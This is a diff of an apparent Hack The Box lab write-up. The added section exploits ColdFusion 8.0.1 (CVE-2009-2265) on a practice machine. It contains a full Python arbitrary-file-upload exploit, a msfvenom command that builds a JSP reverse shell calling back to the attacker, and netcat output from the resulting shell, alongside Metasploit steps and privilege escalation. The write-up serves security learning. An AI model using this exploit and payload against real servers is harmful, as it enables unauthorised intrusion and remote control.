@@ -21,8 +21,8 @@ Doing a Searchsploit on Coldfusion showed a few possible attacks. Trying `Direct
 ### 6. Enumerating ColdFusion Administrative Page
 We were unable to find a use for the admin page, except a System Information button where we found it is a machine running Windows Vista 6.1, ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user tolis, path C:\Users\tolis.
 
-### 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
-We try a Metasploit exploit `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload. Since it failed, we move on to another method, Scheduled Tasks. However, the official documentation continues to use this `ColdFusion 8.0.1 Arbitrary File Upload and Execute` exploit with the help of Burp Suite.
+### 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit (Metasploit)
+We try a Metasploit exploit `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload. Since it failed, we move on to another method, Scheduled Tasks. However, the official documentation continues to use this `ColdFusion 8.0.1 Arbitrary File Upload and Execute` exploit with the help of Burp Suite. That being said, we tried this exploit out and documented in Chapter 10 at the bottom of this write-up, `10. Attacking Machine by Uploading Payload Attempt 3: fck_editor Exploit (Manual)`.
 
 ### 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
 On the ColdFusion administrative site `http://10.10.10.11:8500/CFIDE/administrator/`, there was actually a Scheduled Tasks functionality where we cound use it to schedule the payload to be downloaded.
@@ -37,6 +37,9 @@ To privilege escalate, we choose to get a meterpreter shell to make things easie
 After setting a `multi/handler` to listen for the meterpreter connection, we run our meterpreter payload, and got a meterpreter shell successfully. Since `getsystem` did not work, we use `recon/local_exploit_sugester` to find exploits to privilege escalate.
 
 Trying `ms10_092_schelevator` worked, we got system rights and the system flag.
+
+### 10. Attacking Machine by Uploading Payload Attempt 3: fck_editor Exploit (Manual)
+Running a custom script to take advantage of the `ColdFusion 8.0.1 Arbitrary File Upload and Execute` exploit, we successfully uploaded a `.jsp` reverse shell payload at `http://10.129.127.126:8500/userfiles/file/exploit.jsp`. After starting a nc listener and executing the payload, we got a regular shell successfully.
 
 # Attack
 ## 1. NMAP
@@ -371,7 +374,7 @@ Printers 	Microsoft XPS Document Writer
 ```
 Perfect. We now know it's a Windows Vista 6.1, running ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user `tolis`, path `C:\Users\tolis`.
 
-## 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
+## 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit (Metasploit)
 As we noted previously, it is perhaps time to deploy the [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload.
 ```
 msf5 > use exploit/windows/http/coldfusion_fckeditor
@@ -424,7 +427,9 @@ msf5 exploit(windows/http/coldfusion_fckeditor) > exploit
 ```
 Within seconds of `[*] Sending our POST request...`, it returned with `[-] Upload Failed...`. This apparently is an unusual, quoting IppSec that every request to `10.10.10.11` takes about 30s to return something, there is no way this exploit would know that this request failed this quickly.
 
-At this point, I am lost and looked online for guidance. The official documentation & [IppSec](https://www.youtube.com/watch?v=e9lVyFH7-4o&feature=emb_title&ab_channel=IppSec) managed to still use this `exploit/windows/http/coldfusion_fckeditor` exploit, with the use of Burp Suite. "However, due to the request delay to the target, the Metasploit module fails to run and must be intercepted in Burp Suite, then requested through Burp Repeater." 
+At this point, I am lost and looked online for guidance. The official documentation & [IppSec](https://www.youtube.com/watch?v=e9lVyFH7-4o&feature=emb_title&ab_channel=IppSec) managed to still use this `exploit/windows/http/coldfusion_fckeditor` exploit, with the use of Burp Suite. "However, due to the request delay to the target, the Metasploit module fails to run and must be intercepted in Burp Suite, then requested through Burp Repeater."
+
+Nevertheless, we tried this exploit out and documented in Chapter 10 at the bottom of this write-up, `10. Attacking Machine by Uploading Payload Attempt 3: fck_editor Exploit (Manual)`.
 
 ## 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
 Not wanting to use the Burp suite method, I followed an alternative method as seen from other writeups. Turns out, I missed out a tool I could leverage on from the ColdFusion administrator site.
@@ -717,3 +722,82 @@ meterpreter > cat root.txt
 ce65ceee66b2b5ebaff07e50508ffb90
 ```
 Tada! We got system flag!
+
+## 10. Attacking Machine by Uploading Payload Attempt 3: fck_editor Exploit (Manual)
+From Googling, we see someone writing a [custom script for this exploit](  
+https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload). We take his Python code, modified the `print` to be Python3 syntax, and fired it up.
+```
+hippoeug@kali:~$ cat upload.py
+#!/usr/bin/python
+# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
+# Date: 2017-10-16
+# Exploit Author: Alexander Reid
+# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
+# Version: ColdFusion 8.0.1
+# CVE: CVE-2009-2265 
+# 
+# Description: 
+# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
+# Uploads the specified jsp file to the remote server.
+#
+# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
+# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
+import requests, sys
+
+try:
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    if len(sys.argv) == 5:
+        path = sys.argv[3]
+        with open(sys.argv[4], 'r') as payload:
+            body=payload.read()
+    else:
+        path = ""
+        with open(sys.argv[3], 'r') as payload:
+            body=payload.read()
+except IndexError:
+    print('Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>')
+    print('Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp')
+    sys.exit(-1)
+
+basepath = "http://" + ip + ":" + port + path
+
+print('Sending payload...')
+
+try:
+    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
+    if req.status_code == 200:
+        print('Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp')
+    else:
+        print('Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason)
+except requests.Timeout:
+    print('Failed to upload payload... Request timed out')
+```
+
+We also need a payload, and we will use the JSP payload.
+```
+hippoeug@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=4545 -f raw -o jsp_shell.jsp
+Payload size: 1497 bytes
+Saved as: jsp_shell.jsp
+```
+
+Let's run the modified script.
+``` 
+hippoeug@kali:~$ python3 ./upload.py 10.129.127.126 8500 /home/hippoeug/jsp_shell.jsp
+Sending payload...
+Successfully uploaded payload!
+Find it at http://10.129.127.126:8500/userfiles/file/exploit.jsp
+```
+Nice, uploaded at `http://10.129.127.126:8500/userfiles/file/exploit.jsp`.
+
+All we need is to run a netcat listener, and navigate to the link `http://10.129.127.126:8500/userfiles/file/exploit.jsp`.
+```
+hippoeug@kali:~$ nc -lvnp 4545
+listening on [any] 4545 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.129.127.126] 54733
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\ColdFusion8\runtime\bin>
+```
+And a shell from that. 
